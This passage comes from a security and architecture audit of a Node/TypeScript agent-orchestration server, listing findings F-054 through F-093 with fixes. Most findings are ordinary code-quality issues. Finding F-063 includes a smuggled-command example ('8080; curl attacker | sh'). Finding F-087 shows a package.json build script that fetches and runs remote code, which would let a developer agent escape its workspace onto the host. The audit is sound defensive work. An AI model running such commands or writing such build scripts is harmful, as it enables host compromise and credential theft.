  2. **Law-of-Demeter violation.** state.ts reaches into snapshot internals; callers aren't aware they're hitting the store.
- **Proposed fix:** see `fix.md` F-053 — verify whether the fields are supposed to always exist; if yes, remove the fallback and fail loudly. If genuinely optional, document why; consider moving the getter to the store module so state.ts doesn't pass through.

#### F-054 🟡 [test][arch] · `resetOrchestratorState` has no invariant tying it to the set of exports
- **Where:** `apps/api/src/orchestration/state.ts:157-175`.
- **Observation:** `resetOrchestratorState()` is 18 lines, touching 16 variables. Adding a new `export let` somewhere else in the file without adding a corresponding reset line silently breaks test isolation (new state pollutes the next test).
- **Why it matters:**
  1. **No compile-time safety.** Nothing catches the omission.
  2. **Subtle test failures.** "Worked on my machine" syndrome — tests pass in isolation, fail in certain orders.
  3. **Drift accrues over time.** Every PR that adds mutable state has to remember the reset; some don't.
- **Proposed fix:** see `fix.md` F-054 — the `OrchestrationState` class (F-043) makes this automatic (constructor = reset). Until then, write a meta-test that lists mutable exports and asserts each appears in reset.

#### F-055 🟡 [arch][test] · Null-sentinel DI for `reactiveEventEmitter` and `meetingSchedulerRef` (cross-ref F-013)
- **Where:** `apps/api/src/orchestration/state.ts:138, 143`.
- **Observation:** same pattern as F-013 already logged for server.ts — mutable `let` + setter + getter that returns `| null`. Flagging here because two more instances of the pattern live in this file.
- **Why it matters:** same as F-013.
- **Proposed fix:** see `fix.md` F-055 — bundle with F-013 / F-043; both fields become fields on the `OrchestrationState` class, injected at construction.

#### F-056 🟡 [code] · Magic numbers mixed with config-derived constants
- **Where:** `apps/api/src/orchestration/state.ts:91, 96-98`.
  ```ts
  export const PROMPT_COMPLETION_POLL_INTERVAL_MS = 8_000;            // hardcoded
  export const DEVELOPER_STALL_TIMEOUT_MINUTES = orchestratorConfig.developer.stallTimeoutMinutes;  // from config
  export const MAX_FINDINGS_PER_TASK = 6;                             // hardcoded
  export const CEO_PROPOSAL_FAILURES_BEFORE_COOLDOWN = 3;              // hardcoded
  export const CEO_PROPOSAL_COOLDOWN_MS = 2 * 60 * 1000;               // hardcoded
  ```
- **Observation:** some tuning knobs come from `orchestratorConfig`, others are hardcoded. No principle for which goes where.
- **Why it matters:** operators can tune some timeouts via env, not others. Inconsistent discoverability. A debugging session where "CEO keeps getting stuck in cooldown" would require a code change + deploy instead of an env-var flip.
- **Proposed fix:** see `fix.md` F-056 — push all six values into `config/orchestrator.ts` for a uniform config surface.

#### F-057 🟡 [code] · `workspaceRoot` hardcoded assumes cwd is `apps/api/`
- **Where:** `apps/api/src/orchestration/state.ts:101`.
  ```ts
  export const workspaceRoot = resolve(process.cwd(), "..", "..");
  ```
- **Observation:** relies on `process.cwd()` being two levels below the repo root. Any other cwd (CI script runner, custom Docker command, tool running the module from elsewhere) silently computes a wrong path.
- **Why it matters:**
  1. **Silent breakage.** Wrong cwd → wrong root → wrong workspace path → agents write to or read from an unexpected directory.
  2. **No validation.** Nothing checks the computed path actually points at the repo root.
- **Proposed fix:** see `fix.md` F-057 — env override `ARCEUS_REPO_ROOT`; fail-fast if the computed root doesn't contain a known sentinel (e.g. `package.json` with the right `name`).

#### F-058 🟡 [code] · `setReactiveEventEmitter(fn: typeof reactiveEventEmitter)` obscures callback shape
- **Where:** `apps/api/src/orchestration/state.ts:139`.
- **Observation:** the setter signature uses `typeof reactiveEventEmitter` to reference the type of the `let` declaration above. Clever, but it forces the reader to scroll up to line 138 to see the actual function shape.
- **Why it matters:** readability. For hot-path code that gets touched often, indirection hurts.
- **Proposed fix:** see `fix.md` F-058 — declare a named `type ReactiveEmitter = (...) => void`; use it in both the `let` and the setter.

#### F-059 🟢 [code] · Same status strings used across unrelated state machines
- **Where:** `apps/api/src/orchestration/state.ts:14, 43`.
  ```ts
  status: "idle" | "working" | "done" | "error";       // AgentSessionState (line 14)
  ExecutionStatus = "idle" | "planning" | ... | "error"; // ExecutionStatus (line 43)
  ```
- **Observation:** `"idle"` and `"error"` appear in both enums. A variable typed as bare `string` that equals `"idle"` could be mistaken for either state machine.
- **Why it matters:** minor. Branded types would eliminate this; probably overkill for current scale.
- **Proposed fix:** see `fix.md` F-059 — branded string types if you ever have a bug from this; otherwise document both machines and leave.

#### F-060 🟢 [docs] · No JSDoc on 25+ exported symbols
- **Where:** entire file.
- **Observation:** not a single JSDoc comment on any export. For a file that is imported ~everywhere, this forces readers to grep for usage patterns to understand each field's role.
- **Why it matters:** onboarding cost; reviewer cost; AI-edit hazard (agents guessing semantics).
- **Proposed fix:** see `fix.md` F-060 — JSDoc pass on each export; enable `jsdoc/require-jsdoc` for exported symbols via ESLint.

#### F-061 🟢 [code] · `developerWorkspaceSnapshot: Map<string, number>` with no type alias
- **Where:** `apps/api/src/orchestration/state.ts:116`.
  ```ts
  export let developerWorkspaceSnapshot = new Map<string, number>();
  ```
- **Observation:** `Map<string, number>` tells the reader nothing about what key/value represent. Inferring from usage: probably filename → mtime. But the type signature doesn't say.
- **Why it matters:** small readability hit.
- **Proposed fix:** see `fix.md` F-061 — introduce `type WorkspaceFileMtimes = Map<string /* relative path */, number /* epoch ms */>`; use it.

#### F-062 🟢 [code] · `WORKSPACE_MONITOR_IGNORE` Set constructed at import time
- **Where:** `apps/api/src/orchestration/state.ts:95`.
  ```ts
  export const WORKSPACE_MONITOR_IGNORE = new Set(orchestratorConfig.developer.workspaceMonitorIgnore);
  ```
- **Observation:** `new Set(...)` runs at module load. Tiny import-time side effect; negligible cost but part of the larger "state.ts does work at import" pattern.
- **Why it matters:** nit only.
- **Proposed fix:** see `fix.md` F-062 — lazy getter if it ever matters; otherwise leave.

---

### `apps/api/src/infra/opencode.ts`

#### F-063 🔴 [sec] · `shell: true` on child-process spawn — command-injection vector
- **Where:** `apps/api/src/infra/opencode.ts:197-203`.
  ```ts
  const proc = spawn("opencode", args, {
    shell: true,
    cwd: productWorkspace,
    env: { ...process.env },
  });
  ```
- **Observation:** `shell: true` forces Node to run the command through `/bin/sh -c "..."`. Shell meta-characters (`;`, `|`, `&`, `$(...)`, backticks) in any argv element are interpreted by the shell instead of passed verbatim. Today the args come from `runtimeConfig` (operator-controlled), so the injection vector is latent. One future change — a dashboard that writes `opencodePort` from user input, a config path that accepts a filename with spaces, a test harness that interpolates a value — converts latent into real.
- **Why it matters:**
  1. **One config tweak away from RCE.** A hostile port value like `8080; curl attacker | sh` would execute attacker code with the server's privileges.
  2. **`shell: false` is faster and safer.** Skips the shell, reduces process count, eliminates injection class entirely.
  3. **No reason to use `shell: true` here.** We're not using shell features (pipes, redirection, glob expansion).
- **Proposed fix:** see `fix.md` F-063 — set `shell: false` (Node default); pass args as a plain array.

#### F-064 🟠 [sec] · Full parent process environment copied into child
- **Where:** `apps/api/src/infra/opencode.ts:200-202`.
  ```ts
  env: { ...process.env },
  ```
- **Observation:** every environment variable in the Arceus server process is inherited by the OpenCode child. That includes anything in the server's env — `DATABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, Azure keys for non-OpenCode purposes, any private API tokens for other services, values loaded from `.env`.
- **Why it matters:**
  1. **Secret blast-radius.** If OpenCode is compromised (supply-chain attack, malicious plugin, log scraping), every secret in the Arceus env is exposed.
  2. **Logging risk.** Some programs dump env on crash; OpenCode's crash dump now contains Arceus's secrets.
  3. **No reason for the full transfer.** OpenCode reads a specific small set: Azure credentials, `PATH`, `HOME`. The rest is noise.
- **Proposed fix:** see `fix.md` F-064 — replace with an explicit allowlist: `{ PATH, HOME, AZURE_API_KEY, AZURE_OPENAI_ENDPOINT, ... }`.

#### F-065 🟠 [arch][sec] · `ensureAzureRuntimeEnvironment` mutates the parent's `process.env`
- **Where:** `apps/api/src/infra/opencode.ts:67-74`.
  ```ts
  function ensureAzureRuntimeEnvironment() {
    process.env.AZURE_RESOURCE_NAME = runtimeConfig.azureResourceName;
    process.env.AZURE_OPENAI_ENDPOINT = runtimeConfig.azureEndpoint;
    process.env.AZURE_OPENAI_API_KEY = runtimeConfig.azureApiKey;
    process.env.AZURE_OPENAI_API_VERSION = runtimeConfig.azureApiVersion;
    process.env.AZURE_API_KEY = runtimeConfig.azureApiKey;  // OpenCode quirk
  }
  ```
- **Observation:** sets five env vars on the Arceus parent process so that when OpenCode spawns later, the child inherits them. The side effect leaks to every other library / module running in the parent — tests that assert env-var absence break; other Azure-reading SDKs in the parent suddenly have credentials they didn't before.
- **Why it matters:**
  1. **Global mutation.** `process.env` is the most global state in a Node program — changes affect *every* library.
  2. **Write-before-read ordering.** Called inside `getOpencode()` (async). Code paths that read `AZURE_API_KEY` before `getOpencode()` runs observe `undefined`; after it runs, they observe the key. Behavior depends on call order.
  3. **No reason to pollute parent.** OpenCode reads from *its own* env; just set the env of the child at spawn time.
- **Proposed fix:** see `fix.md` F-065 — move the env vars into the child-spawn env allowlist (bundled with F-064); delete this function.

#### F-066 🟠 [reliability][resource] · `resetOpencodeConnection` forgets the child process → zombies
- **Where:** `apps/api/src/infra/opencode.ts:286-288`.
  ```ts
  export function resetOpencodeConnection() {
    opencodePromise = null;
  }
  ```
- **Observation:** the function drops the in-memory handle but does not kill the spawned OpenCode process. The child keeps running, keeps listening on its port, keeps holding sqlite file locks. The next `getOpencode()` call detects the still-alive server (via `detectExistingOpencodeServer`) and reconnects — so we silently adopt the zombie.
- **Why it matters:**
  1. **Over time, zombie processes accumulate.** Each `resetOpencodeConnection` call that precedes a successful reconnect-to-existing is fine. Each one that precedes a failed reconnect + new spawn strands the previous child.
  2. **Resource pressure.** File descriptors, ports, RAM, sqlite locks — all proportional to zombie count.
  3. **Shutdown doesn't clean them either.** The parent exits; children may become defunct (reparented to PID 1) until they die on their own.
- **Proposed fix:** see `fix.md` F-066 — track the `ChildProcess` alongside the promise; on reset, `proc.kill("SIGTERM")` and wait briefly for exit, then `SIGKILL` if still alive.

#### F-067 🟡 [perf][resource] · `proc.stdout` / `proc.stderr` listeners never removed after server startup
- **Where:** `apps/api/src/infra/opencode.ts:205-240`.
- **Observation:** `spawnOpencodeServer` attaches `.on("data", ...)` handlers to both streams and a closure-captured `output` string. On resolve, the listeners stay attached; the `output` string keeps growing forever as OpenCode writes log lines.
- **Why it matters:**
  1. **Memory leak.** Proportional to OpenCode's log volume over the server's lifetime.
  2. **CPU waste.** Every stdout/stderr chunk triggers our handler and a string concat — unnecessary after startup.
- **Proposed fix:** see `fix.md` F-067 — extract the handler into a named function, detach after resolve: `proc.stdout.off("data", handler)`; optionally re-attach a lighter handler that pipes to structured logging.

#### F-068 🟡 [obs] · `destroyBeatSession` silently swallows every error
- **Where:** `apps/api/src/infra/opencode.ts:400-407`.
  ```ts
  export async function destroyBeatSession(sessionId: string): Promise<void> {
    try {
      const opencode = await getOpencode();
      await fetch(`${opencode.server.url}/session/${sessionId}`, { method: "DELETE" });
    } catch {
      // Silently swallow — session cleanup is best-effort
    }
  }
  ```
- **Observation:** the comment admits the intent — "best-effort." But there's no observability on how often "best-effort" actually fails. A systemic outage in the DELETE path would leak sessions indefinitely, server-side, until OpenCode's sqlite blows up.
- **Why it matters:**
  1. **Silent session leak.** OpenCode's session store grows without bound if deletes silently fail.
  2. **No incident signal.** Operators can't alert on "DELETE rate dropped to zero" without a metric.
  3. **Decision-blindness.** "Should we switch to a different session cleanup strategy?" is unanswerable without data.
- **Proposed fix:** see `fix.md` F-068 — warn-level log + audit entry on failure; a `sessionDeleteFailures` counter exposed as a metric.

#### F-069 🟠 [arch] · Module-level promise singletons (cross-ref F-043)
- **Where:** `apps/api/src/infra/opencode.ts:14-15`.
  ```ts
  let opencodePromise: Promise<OpencodeInstance> | null = null;
  let ceoSessionPromise: Promise<Session> | null = null;
  ```
- **Observation:** two more module-level singletons in the same family as F-043. One process can have exactly one OpenCode manager, exactly one CEO session. Tests, multi-tenant future, and parallel-server scenarios all blocked.
- **Why it matters:** same as F-043.
- **Proposed fix:** see `fix.md` F-069 — wrap in `OpencodeManager` class owned by `startServer()`; parallels F-043.

#### F-070 🟡 [code] · Workspace-path computation duplicated (cross-ref F-049)
- **Where:** `apps/api/src/infra/opencode.ts:17-23`.
- **Observation:** same computation as `state.ts:101-104` and the F-049 fix target. Already flagged.
- **Proposed fix:** see `fix.md` F-070 — bundled with F-049.

#### F-071 🟡 [race] · TOCTOU race in `reservePort`
- **Where:** `apps/api/src/infra/opencode.ts:115-143`.
  ```ts
  function reservePort(hostname, port) {
    return new Promise((resolve, reject) => {
      const server = createServer();
      server.listen({ host, port }, () => {
        const address = server.address();
        server.close(() => resolve(address.port));
      });
    });
  }
  ```
- **Observation:** classic **Time-Of-Check / Time-Of-Use** race. We bind to check availability (TOC), close immediately, return the port number. The caller then spawns OpenCode which attempts to bind the same port (TOU). Between close and spawn, any other process can grab the port.
- **Why it matters:**
  1. **Intermittent spawn failures.** CI environments running parallel tests hit this regularly.
  2. **Confusing error.** The operator sees "port in use" after we "checked" and got "available" — looks like a bug.
- **Proposed fix:** see `fix.md` F-071 — retry `spawnOpencodeServer` on `EADDRINUSE` (already partially done at lines 176-181); accept that the reservation is advisory; prefer ephemeral port assignment (`port: 0`) when tolerable.

#### F-072 🟡 [code] · Port-conflict detection via error-message substring match
- **Where:** `apps/api/src/infra/opencode.ts:157-160`.
  ```ts
  function isPortConflictError(error: unknown, port: number) {
    const message = error instanceof Error ? error.message : String(error);
    return message.includes(`Failed to start server on port ${port}`) || message.includes("EADDRINUSE");
  }
  ```
- **Observation:** detection depends on a specific OpenCode error-message substring. If OpenCode changes the phrasing in a release, our fallback-to-random-port logic silently stops working.
- **Why it matters:** brittle coupling to an external program's human-readable output. Same category of flaw as F-073 (stdout parsing).
- **Proposed fix:** see `fix.md` F-072 — prefer `error.code === "EADDRINUSE"` when the error is a Node `ErrnoException`; fall back to substring match only as a last resort.

#### F-073 🟡 [code] · stdout parsed via `startsWith` + regex to find server URL
- **Where:** `apps/api/src/infra/opencode.ts:216-223`.
  ```ts
  if (line.startsWith("opencode server listening")) {
    const match = line.match(/on\s+(https?:\/\/[^\s]+)/);
    if (match) { ... }
  }
  ```
- **Observation:** we extract the server URL by pattern-matching on the child's stdout. Any change to OpenCode's startup log — capitalization, phrasing, color codes, extra context — breaks detection. Server spawns fine; we time out waiting for the "listening" string; whole thing fails with a generic timeout error.
- **Why it matters:**
  1. **Cross-program coupling via free text.** The most fragile form of IPC.
  2. **Hard to debug.** The failure looks like "spawn timeout" but the actual cause is "log format changed."
- **Proposed fix:** see `fix.md` F-073 — prefer a structured protocol if OpenCode's SDK exposes one; otherwise match multiple known variants (case-insensitive, strip ANSI codes); surface the raw output in the timeout error so operators can see what actually happened.

#### F-074 🟡 [obs] · stderr accumulated but not surfaced during normal operation
- **Where:** `apps/api/src/infra/opencode.ts:227-229`.
  ```ts
  proc.stderr?.on("data", (chunk: Buffer) => {
    output += chunk.toString();
  });
  ```
- **Observation:** stderr is captured into the same `output` buffer as stdout, but only dumped when the child **exits with an error** (line 233). During normal operation, OpenCode's stderr (deprecation warnings, fallback notices, runtime issues it can survive) is silently discarded.
- **Why it matters:**
  1. **Warnings invisible.** "OpenCode is about to break on version X" kinds of signals never reach us.
  2. **Post-mortem incomplete.** Once OpenCode finally crashes, we have a dump — but everything it said in the hours leading up is gone.
- **Proposed fix:** see `fix.md` F-074 — pipe stderr to the structured logger in real time at warn level; retain a recent ring buffer for exit diagnostics.

#### F-075 🟠 [code] · Shallow merge in `loadOpencodeConfig` silently drops nested keys
- **Where:** `apps/api/src/infra/opencode.ts:34-35`.
  ```ts
  const base = JSON.parse(raw);
  return { ...base, ...overrides };
  ```
- **Observation:** top-level-only spread. If `base.agents = { ceo: {...}, dev: {...} }` and `overrides.agents = { ceo: {...patched} }`, the result is `{ agents: { ceo: {...patched} } }` — `dev` is gone.
- **Why it matters:**
  1. **Silent data loss.** No error, no warning, just missing fields in the merged config.
  2. **Latent bug.** Today's overrides are top-level scalars (`share: "disabled"`), so nothing is lost. The day someone adds a nested override, it loses data silently.
- **Proposed fix:** see `fix.md` F-075 — deep merge via a small helper or a vetted library (`deepmerge`); document intended merge semantics (arrays replace vs concat — pick one).

#### F-076 🟠 [perf][race] · `syncOpencodeConfigToWorkspace` does synchronous I/O and is called twice per spawn
- **Where:** `apps/api/src/infra/opencode.ts:48-65`; called at both `:195` (inside `spawnOpencodeServer`) and `:248` (inside `getOpencode`).
- **Observation:** the function synchronously writes `opencode.json`, creates `.opencode/prompts/` directory, and copies every prompt file. Called from two sites, so **every spawn does the file sync twice**. Concurrent callers race on the filesystem.
- **Why it matters:**
  1. **Event loop blocked.** `writeFileSync` / `mkdirSync` / `copyFileSync` all block. Long copies = long pauses.
  2. **Duplicated work.** Two identical passes per spawn.
  3. **Race on concurrent spawns.** Two tests each spawning OpenCode race for the same `opencode.json`; one can overwrite the other's in-progress write.
- **Proposed fix:** see `fix.md` F-076 — call once per lifecycle (init, not per spawn); use async `fs.promises.*`; atomic write via write-to-tmp + rename; deduplicate the two call sites.

#### F-077 🟡 [code] · `loadOpencodeConfig` catch can't distinguish missing-file from malformed-JSON
- **Where:** `apps/api/src/infra/opencode.ts:32-39`.
  ```ts
  try {
    const raw = readFileSync(configPath, "utf8");
    const base = JSON.parse(raw);
    return { ...base, ...overrides };
  } catch {
    return overrides;
  }
  ```
- **Observation:** any error — file missing, file unreadable, file present but malformed JSON — all fall through to "return overrides." An operator who edits `opencode.json` and saves a syntax error gets no feedback; their changes silently don't apply.
- **Why it matters:** malformed JSON is a configuration bug the operator needs to see. Treating it as "optional file" produces a confusing support loop.
- **Proposed fix:** see `fix.md` F-077 — only swallow `ENOENT`; re-throw `SyntaxError` (parse error) so the caller sees it.

#### F-078 🟡 [code] · `ensureAzureRuntimeEnvironment` doesn't validate required inputs
- **Where:** `apps/api/src/infra/opencode.ts:67-74`.
- **Observation:** writes whatever `runtimeConfig.azure*` contains into `process.env`, including `undefined` if any field is missing. OpenCode starts with a missing/blank API key and fails in a confusing way later.
- **Why it matters:** missing config should fail fast at startup, not mid-request with an opaque auth error from OpenCode.
- **Proposed fix:** see `fix.md` F-078 — assert each required field is a non-empty string; throw a clear `"Missing ARCEUS_AZURE_API_KEY"` error at server boot.

#### F-079 🟠 [reliability] · `postOpencodeJson` has no per-request timeout
- **Where:** `apps/api/src/infra/opencode.ts:309-333`.
- **Observation:** `fetch(...)` is called without an `AbortSignal`. If OpenCode hangs (deadlocked tool call, stuck network), the call blocks indefinitely. `resilientCall` adds retry logic but doesn't bound individual attempts.
- **Why it matters:**
  1. **Request can hang forever.** One stuck call holds the caller; if many stuck calls pile up, the whole orchestrator grinds.
  2. **No way to cancel.** Operator has no mechanism to abort a stuck request short of killing the process.
- **Proposed fix:** see `fix.md` F-079 — attach an `AbortController` with a per-call timeout (e.g. 30s default, tunable via config).

#### F-080 🟡 [sec][reliability] · `detectExistingOpencodeServer` doesn't verify it's actually OpenCode
- **Where:** `apps/api/src/infra/opencode.ts:76-99`.
- **Observation:** the probe hits `/event` with `Accept: text/event-stream` and treats any `response.ok` as "OpenCode is running here." Any unrelated SSE-capable server at the same URL (a dev's Express app, a Grafana probe endpoint, a bogus service) produces a false positive. We connect to it and fail in confusing downstream ways.
- **Why it matters:**
  1. **False reuse.** We try to drive a non-OpenCode server with OpenCode API calls. Errors are obscure.
  2. **Latent security risk.** If the non-OpenCode service is attacker-controlled, we hand it Azure credentials during `connectOpencodeClient`.
- **Proposed fix:** see `fix.md` F-080 — use a known-OpenCode endpoint (`GET /version` or equivalent) and verify a field of the response (e.g. `{ name: "opencode" }`).

#### F-081 🟡 [sec] · Hardcoded `http://` for OpenCode URL
- **Where:** `apps/api/src/infra/opencode.ts:251`.
  ```ts
  const existingUrl = `http://${runtimeConfig.opencodeHost}:${runtimeConfig.opencodePort}`;
  ```
- **Observation:** protocol scheme is hardcoded to `http://`. If `opencodeHost` ever points at a remote OpenCode deployment (not localhost), the Azure API key is transmitted unencrypted during `connectOpencodeClient`.
- **Why it matters:** today OpenCode runs locally, so this is fine. It's one env-var change away from leaking keys across the network.
- **Proposed fix:** see `fix.md` F-081 — allow `http://` only for `localhost`/`127.0.0.1`; require `https://` for any non-local host; make the scheme part of the config, validated with Zod.

#### F-082 🟡 [resource] · `openOpencodeEventStream` reader has no enforced cleanup
- **Where:** `apps/api/src/infra/opencode.ts:335-349`.
- **Observation:** the function returns `response.body.getReader()` directly. Callers are expected to call `.cancel()` when done. Nothing enforces it — a forgetful caller leaks the connection.
- **Why it matters:** long-running Arceus builds up open fetch connections per forgotten reader.
- **Proposed fix:** see `fix.md` F-082 — wrap in a helper that accepts `(chunk) => void` and handles the cleanup; OR return a `{ reader, cancel }` pair and add an explicit JSDoc contract; OR use an `AbortSignal` parameter.

#### F-083 🟡 [obs] · No audit-ledger integration anywhere in this file
- **Where:** entire file — no `audit(...)` calls; observability is `console.log` / `console.warn`.
- **Observation:** OpenCode spawn, exit, warmup, cache invalidation, session create/destroy, retry cycles — none emit audit entries. Operators trying to understand "why did agents stall yesterday" have no durable record.
- **Why it matters:**
  1. **Post-mortem impossible.** Logs scrolled past; audit has nothing.
  2. **No time-series metrics.** Can't alert on "OpenCode crash rate" or "session leak."
  3. **Debugging agent behavior relies on luck.** If it's not in stderr at the moment of the issue, it's gone.
- **Proposed fix:** see `fix.md` F-083 — audit events on every significant lifecycle point: `opencode.spawn.{start,success,failed}`, `opencode.child.exited`, `opencode.reset`, `opencode.session.{create,destroy,destroy_failed}`.

#### F-084 🟡 [obs] · `warmUpOpencode` failure silently clears cache (cross-ref F-041)
- **Where:** `apps/api/src/infra/opencode.ts:295-307`.
- **Observation:** on failure, `console.warn` + `opencodePromise = null`. Caller (via `void warmUpOpencode()` in server.ts) never sees the failure. Same root issue as F-041 (fire-and-forget warmup).
- **Why it matters:** same as F-041.
- **Proposed fix:** see `fix.md` F-084 — bundle with F-041 + F-083; add audit emit + logger usage here; consider a `getOpencodeStatus()` that routes can query.

#### F-085 🟢 [type][code] · `as T` cast on fetch response body
- **Where:** `apps/api/src/infra/opencode.ts:329`.
  ```ts
  return (await response.json()) as T;
  ```
- **Observation:** the TypeScript type of `T` is whatever the caller claims. `response.json()` returns `any`. The cast is a lie — if OpenCode returns a shape that doesn't match `T`, TypeScript happily believes us and downstream code blows up.
- **Why it matters:** 🟢 nit while OpenCode's contract is stable; 🟡 when OpenCode releases a breaking change.
- **Proposed fix:** see `fix.md` F-085 — accept a `zodSchema` parameter and `schema.parse(await response.json())`; consumers pass schemas explicitly.

---

### `apps/api/src/persistence/control-plane.ts`

#### F-086 🔴 [arch][data-integrity] · Optimistic concurrency (CAS) check is commented out — silent lost writes
- **Where:** `apps/api/src/persistence/control-plane.ts:132-140`.
  ```ts
  // Optimistic concurrency check — disabled: with concurrent heartbeats the
  // version races ahead and every agent's mutations get discarded.
  // if (expectedVersion !== undefined && expectedVersion !== snapshotVersion) { ... }
  ```
- **Observation:** the guard that rejects stale-version mutations is commented out. The `expectedVersion` parameter is accepted by every caller but ignored by this function. The stated reason in the comment ("version races ahead") is actually what CAS is *supposed* to detect — the real root cause is that `snapshotVersion` is **process-global** instead of **per-entity**: two agents mutating *different* tasks artificially conflict on the same counter.
- **Why it matters:**
  1. **Lost writes are silent.** Agent A and Agent B both read snapshot at v5 and both decide to mutate task-42 differently; both mutations apply; last writer wins without any conflict signal.
  2. **The contract is a lie.** `expectedVersion` is threaded through every caller, documented in comments, but the check is dead code. Callers believe they're getting conflict detection.
  3. **All downstream invariants are weaker than advertised.** Anything that relies on "mutations reflect the snapshot they were built from" (audit trails, reactive events, task-status invariants) is on thin ice.
- **Proposed fix:** see `fix.md` F-086 — near-term: re-enable the check + make callers retry on conflict; medium-term: switch to per-entity versioning (CAS on the mutated id, not on the global counter) so unrelated mutations don't collide; long-term: DB-transactional mutations.

#### F-087 🔴 [sec] · `execSync("npm run build")` in an agent-writable workspace = remote code execution
- **Where:** `apps/api/src/persistence/control-plane.ts:762-770`.
  ```ts
  let cmd = "npx tsc --noEmit";
  try {
    const pkg = JSON.parse(require("node:fs").readFileSync(pkgPath, "utf-8"));
    if (pkg.scripts?.build) cmd = "npm run build";
  } catch { /* use default */ }
  execSync(cmd, { cwd: productDir, timeout: 30_000, stdio: "pipe", shell: true as any });
  ```
- **Observation:** the build check reads `package.json` from the *product* workspace (where agents write files) and if it has a `build` script, runs **`npm run build`** — which executes whatever string is in `scripts.build`. An agent that writes `{"scripts":{"build":"curl attacker.com/x | sh"}}` achieves arbitrary code execution as the Arceus server process. `shell: true as any` is also redundant + suspicious; `execSync` uses a shell by default for string commands.
- **Why it matters:**
  1. **Workspace-to-host escape.** An agent with the ability to write `package.json` (which every developer-agent has) can run any code on the Arceus host.
  2. **Combined with F-063 / F-064** (opencode spawn flaws), this path is the final hop in a credential-exfiltration chain.
  3. **`execSync` is the wrong API regardless** — blocks the event loop (see F-093).
- **Proposed fix:** see `fix.md` F-087 — never run `npm run build` from this path; always use a fixed, non-shell command array (`spawn("npx", ["tsc", "--noEmit"], { shell: false })`); run in a sandbox if blast-radius matters.

#### F-088 🔴 [arch][data-integrity] · `cpApplyMutations` is non-atomic despite the docstring
- **Where:** `apps/api/src/persistence/control-plane.ts:121-189`.
  ```ts
  /** Apply a batch of mutations atomically. ... */
  for (const mutation of mutations) {
    try { applyOneMutation(...); applied++; }
    catch (err) { errors.push(...); audit({...}); }  // continue
  }
  const version = bumpVersion();  // bumped once
  ```
- **Observation:** the docstring says "atomically," but the code iterates per-mutation with a per-mutation try/catch that continues on failure. A batch of 5 where mutation 3 throws ends up with mutations 1 and 2 **live in the store** and 3, 4, 5 never applied. The version bumps once. Caller sees `{ applied: 2, errors: [...] }` with no way to know which mutations landed.
- **Why it matters:**
  1. **Paired writes get unpaired.** A task status-change that should land together with its paired audit or sprint update can split — state and ledger drift.
  2. **The contract misleads callers.** Anyone reading the docstring assumes rollback-on-failure.
  3. **Retry becomes ambiguous.** Which mutations to retry? The caller can't tell without parsing error strings.
- **Proposed fix:** see `fix.md` F-088 — all-or-nothing: validate every mutation first, apply only if all validate, else reject. Eventually: DB-transactional batch via `db.transaction(...)`.

#### F-089 🟠 [arch] · Seven module-level mutable singletons (F-043 family)
- **Where:** `apps/api/src/persistence/control-plane.ts:68-76, 741-743, 787, 967`.
  ```ts
  let snapshotVersion = 0;
  let buildCheckProductDir: string | null = null;
  let mutationCount = 0;
  const startedAt = new Date().toISOString();
  let lastBuildCheck = { ... };
  const trustScoreCache = new Map<string, TrustScore>();
  const recentViolationsCache: PolicyViolation[] = [];
  ```
- **Observation:** seven module-level variables. Two are live caches (trust, violations) expected to stay consistent with the DB. No ownership boundary, no lifecycle, no reset hook, no per-tenant scoping.
- **Why it matters:** same as F-043 at this file's scale. Cache invalidation under concurrent access is reasoning-proof; tests leak state; multi-tenant impossible; lifecycle undefined.
- **Proposed fix:** see `fix.md` F-089 — wrap in a `ControlPlane` class owned by `startServer()`. Same pattern as F-043 / F-069.

#### F-090 🟠 [type] · Seven `as any` casts inside `applyOneMutation`
- **Where:** `apps/api/src/persistence/control-plane.ts:196-262`.
  ```ts
  status: mutation.status as any
  upsertTask(mutation.task as any)
  upsertSprint(mutation.sprint as any)
  upsertMeeting(mutation.meeting as any)
  upsertApproval(mutation.approval as any)
  appendChatMessage(mutation.message as any)
  appendTransition(mutation.transition as any)
  ```
- **Observation:** every case in the mutation switch uses `as any` to bridge the `StateMutation` per-variant shape and the store-helper signatures. The casts silence type errors that flag real shape mismatches.
- **Why it matters:**
  1. **Runtime shape-mismatch is possible.** A mutation missing a required field passes through the cast.
  2. **Type refactors don't propagate.** Renaming a field on `Task` or `Sprint` doesn't flag these call sites.
  3. **Same pattern as F-009 at 7× scale.**
- **Proposed fix:** see `fix.md` F-090 — align the `StateMutation` discriminated union with the store-helper parameter types; delete every cast in this switch.

#### F-091 🟠 [obs][reliability] · Persistence-write failure silently swallowed
- **Where:** `apps/api/src/persistence/control-plane.ts:169`.
  ```ts
  void schedulePersistedCompanyState(snapshot, getEvents()).catch(() => {});
  ```
- **Observation:** after mutations apply, the async DB write is fire-and-forget with an empty `.catch`. If DB writes fail — network blip, credentials rotated, DB overloaded — no audit, no log, no metric, no retry.
- **Why it matters:** same family as F-001 / F-006 / F-027 / F-041 / F-091 — Arceus has a strong "silently fail" culture. This is *the* durability gap for write-back cache (F-002) made real.
- **Proposed fix:** see `fix.md` F-091 — `.catch(err => audit.auditError(...))`; expose a "unflushed mutations" metric; alert when the metric climbs.

#### F-092 🟠 [arch] · `cpLoadAgentContext` is a 165-line god function
- **Where:** `apps/api/src/persistence/control-plane.ts:392-556`.
- **Observation:** single function does 12 things: load snapshot, find agent, filter tasks (with CEO/PM special case), special tester-during-review logic, collect artifacts, fetch tools, trust-filter tools, assemble memories, collect meetings/approvals, run build check **as a side effect**, emit activity event, return context.
- **Why it matters:** SRP violation at maximum scale. Impossible to test in isolation. Any single concern (e.g. the trust filter) has to be tested via this whole function.
- **Proposed fix:** see `fix.md` F-092 — extract into `apps/api/src/heartbeats/build-agent-context.ts`; each sub-responsibility becomes a named helper.

#### F-093 🟠 [perf][reliability] · `execSync` blocks the event loop for up to 30 seconds
- **Where:** `apps/api/src/persistence/control-plane.ts:750-778` (called from `cpLoadAgentContext:483`).
- **Observation:** `execSync` is strictly synchronous. With a 30-second timeout, the Node event loop cannot process any other work during that span — no HTTP, no timers, no heartbeats, no shutdown. Called inside `cpLoadAgentContext` which fires on every CTO/developer beat.
- **Why it matters:**
  1. **Server unresponsiveness.** Under CTO-beat load, the server appears to hang for up to 30s.
  2. **Heartbeat cascade.** Every agent's beat may wait on this; throughput collapses.
  3. **Shutdown blocked.** Graceful shutdown can't preempt an in-flight `execSync`.
- **Proposed fix:** see `fix.md` F-093 — `execFile` / `spawn` (async); cache the result; agents read cached only.

